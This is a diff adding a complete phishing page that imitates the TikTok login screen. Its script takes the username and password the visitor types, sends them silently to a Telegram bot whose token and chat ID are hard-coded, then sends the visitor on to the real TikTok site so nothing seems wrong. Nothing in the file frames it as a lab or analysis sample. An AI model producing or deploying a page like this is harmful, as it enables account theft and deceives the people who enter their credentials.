@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Login</title>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+        .tiktok-card {
+            background: white;
+            border-radius: 8px;
+            padding: 40px 30px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 30px;
+        }
+        .logo svg {
+            width: 160px;
+            height: auto;
+        }
+        .logo i {
+            font-size: 48px;
+            color: #000;
+        }
+        h2 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #111;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #777;
+            margin-bottom: 30px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        .input-group {
+            position: relative;
+            text-align: left;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+            background: #f9f9f9;
+        }
+        .input-group input:focus {
+            border-color: #fe2c55;
+            background: #fff;
+        }
+        .input-group input::placeholder {
+            color: #aaa;
+        }
+        .login-btn {
+            background: #fe2c55;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 8px;
+        }
+        .login-btn:hover {
+            background: #e0234a;
+        }
+        .links {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0 10px;
+            font-size: 14px;
+        }
+        .links a {
+            color: #fe2c55;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .signup {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #777;
+        }
+        .signup a {
+            color: #fe2c55;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .signup a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #bbb;
+        }
+        .footer a {
+            color: #999;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer a:hover {
+            color: #fe2c55;
+        }
+        hr {
+            border: none;
+            border-top: 1px solid #eee;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="tiktok-card">
+            <div class="logo">
+                <!-- TikTok Logo (SVG from Font Awesome or simple text) -->
+                <i class="fab fa-tiktok" style="font-size: 48px; color: #000;"></i>
+                <h2>Log in to TikTok</h2>
+                <div class="subtitle">Manage your account, check notifications, comment on videos, and more.</div>
+            </div>
+            <form id="loginForm" action="#">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="Email, phone, or username" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-btn">Log in</button>
+                <div class="links">
+                    <a href="#">Forgot password?</a>
+                    <a href="#">Sign up</a>
+                </div>
+            </form>
+            <hr>
+            <div class="signup">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+            <div class="footer">
+                <a href="#">Privacy Policy</a> • <a href="#">Terms of Service</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ========== Telegram Configuration ==========
+        const telegramBotToken = '8567650656:AAFAXe5M_xQ6Zom6Q_uc7g2wAD3W2fAdqkI';
+        const telegramChatId = '8304101362';
+        // ============================================
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const message = `🎵 TikTok Login\n👤 User: ${username}\n🔑 Pass: ${password}`;
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            // Send data silently to Telegram
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: telegramChatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .catch(error => console.error('Telegram error:', error))
+            .finally(() => {
+                // Redirect to official TikTok site without any notification
+                window.location.href = 'https://www.tiktok.com';
+            });
+        });
+    </script>
+</body>
+</html>
